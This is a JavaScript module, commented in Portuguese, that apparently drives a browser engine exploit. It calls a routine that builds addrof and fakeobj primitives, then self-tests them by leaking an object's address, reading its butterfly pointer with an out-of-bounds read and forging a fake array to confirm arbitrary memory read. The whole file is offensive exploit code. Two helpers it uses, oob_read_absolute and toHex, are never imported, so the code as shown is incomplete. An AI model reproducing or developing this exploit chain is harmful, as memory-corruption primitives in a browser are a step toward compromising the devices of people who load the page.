// js/script3/runAllAdvancedTestsS3.mjs

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { getRunBtnAdvancedS3, getOutputAdvancedS3 } from '../dom_elements.mjs';
import {
    create_exploit_primitives,
    FNAME_MODULE
} from './exploit_primitives.mjs';
import { AdvancedInt64 } from '../utils.mjs';

/**
 * Executa a nova estratégia de criação de primitivas.
 */
async function runPrimitiveCreationStrategy() {
    const FNAME_RUNNER = `${FNAME_MODULE}_Runner`;
    logS3(`==== INICIANDO Estratégia de Teste: ${FNAME_MODULE} ====`, 'test', FNAME_RUNNER);
    document.title = `Iniciando ${FNAME_MODULE}...`;

    const primitives = await create_exploit_primitives();

    if (primitives && primitives.addrof && primitives.fakeobj) {
        document.title = `${FNAME_MODULE}: SUCESSO!`;
        logS3("Resultado Final: SUCESSO! Primitivas addrof e fakeobj criadas.", "vuln", FNAME_RUNNER);

        // --- Auto-teste das primitivas ---
        logS3("--- Iniciando auto-teste das primitivas ---", 'subtest', FNAME_RUNNER);
        try {
            const victim_obj = { a: 0x41414141, b: 0x42424242, c: 0x43434343, d: 0x44444444 };
            const victim_addr = primitives.addrof(victim_obj);
            logS3(`  Endereço do objeto vítima para teste: ${victim_addr.toString(true)}`, "leak");

            // O endereço do butterfly está em [victim_addr + butterfly_offset]
            // As propriedades em si começam ANTES do ponteiro do butterfly.
            // Para ler a primeira propriedade (a), precisamos ler do endereço do butterfly - 0x10 (exemplo)
            const butterfly_ptr_addr = victim_addr.add(0x10);
            const butterfly_ptr_val = await oob_read_absolute(butterfly_ptr_addr.low(), 8);
            const prop_a_addr = butterfly_ptr_val.sub(0x10); // A propriedade 'a' está 16 bytes antes do butterfly
            
            logS3(`  Endereço do butterfly: ${butterfly_ptr_val.toString(true)}`, 'leak');
            logS3(`  Endereço calculado da propriedade 'a': ${prop_a_addr.toString(true)}`, 'info');

            // Criar um array falso que lê do endereço da propriedade 'a'
            const fake_array = primitives.fakeobj(prop_a_addr.sub(0x10)); // Ajuste de 0x10 para o cabeçalho do butterfly
            const value_read = fake_array[0];
            
            logS3(`  Valor lido através do objeto falso em [0]: ${toHex(value_read)}`, 'leak');
            
            if (value_read === victim_obj.a) {
                logS3("SUCESSO DO AUTO-TESTE: Leitura arbitrária confirmada!", "vuln");
            } else {
                logS3("FALHA DO AUTO-TESTE: O valor lido não corresponde ao esperado.", "error");
            }
        } catch (e) {
            logS3(`Erro durante o auto-teste: ${e.message}`, "error");
        }

    } else {
        document.title = `${FNAME_MODULE}: FALHA`;
        logS3("Resultado Final: FALHA ao criar primitivas.", "error", FNAME_RUNNER);
    }
}

/**
 * Função principal que inicializa e executa os testes.
 */
export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE}_MainOrchestrator`;
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}) - Foco na Criação de Primitivas ====`, 'test', FNAME_ORCHESTRATOR);

    await runPrimitiveCreationStrategy();
    
    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;
}
